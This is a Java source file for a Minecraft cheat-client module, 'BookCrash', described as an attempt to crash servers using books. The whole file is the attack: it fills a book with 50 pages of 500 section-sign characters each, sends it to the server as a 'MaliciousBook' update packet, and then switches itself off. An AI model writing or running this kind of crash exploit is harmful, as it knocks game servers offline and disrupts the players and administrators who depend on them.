package com.LegitSkillIssue.client.module.world;

import com.LegitSkillIssue.client.module.Module;
import com.LegitSkillIssue.client.module.Category;
import net.minecraft.network.packet.c2s.play.BookUpdateC2SPacket;
import java.util.ArrayList;
import java.util.List;
import java.util.Optional;

public class BookCrashModule extends Module {
    public BookCrashModule() {
        super("BookCrash", "Attempts to crash server using books.", Category.WORLD);
    }

    @Override
    public void onTick() {
        if (mc.player == null || mc.getNetworkHandler() == null) return;

        List<String> pages = new ArrayList<>();
        for (int i = 0; i < 50; i++) {
            pages.add("§".repeat(500));
        }
        
        mc.getNetworkHandler().sendPacket(new BookUpdateC2SPacket(mc.player.getInventory().selectedSlot, pages, Optional.of("MaliciousBook")));
        setEnabled(false);
    }
}
